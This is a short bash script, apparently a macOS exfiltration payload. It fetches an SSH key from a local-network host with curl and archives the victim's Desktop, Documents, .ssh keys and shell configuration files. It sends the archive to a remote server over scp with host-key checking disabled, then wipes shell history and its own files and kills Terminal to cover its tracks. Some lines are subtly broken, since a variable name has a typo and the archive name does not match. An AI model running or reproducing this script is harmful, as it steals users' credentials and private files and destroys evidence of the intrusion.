#!/bin/bash

HOME="/Users/$USER"
SSH_HOST="192.168.1.216"
SSH_USER="zed"
SSH_KEY_URL="http://192.168.1.216/sh"
LOCAL_LOOT_PATH="/tmp/.s/.t/.e/.a/.l/"
REMOTE_LOOT_PATH="~/demo/"


mkdir -p $LOCAL_LOOT_PATH
curl -s http://192.168.1.216/sh -o $LOCAL_LOOT_PATH/.s 
chmod 600 $LOCAL_LOOT_PATH/.s

cd $LOCAL_LOOT_PATH
tar cfz .loot.tgz $HOME/Desktop $HOME/Documents $HOME/.ssh $HOME/.bash* $HOME/.config $HOME/.zsh*

scp -q -o StrictHostKeyChecking=no -i $LOCAL_LOOT_PATHs/.s $LOCAL_LOOT_PATH/loot.tgz zed@$SSH_HOST:$REMOTE_LOOT_PATH

set -e && rm -f $HOME/Desktop/.s.png && rm -rf /tmp/.s $HOME/.bash_history $HOME/.zsh_history && history -c

killall Terminal
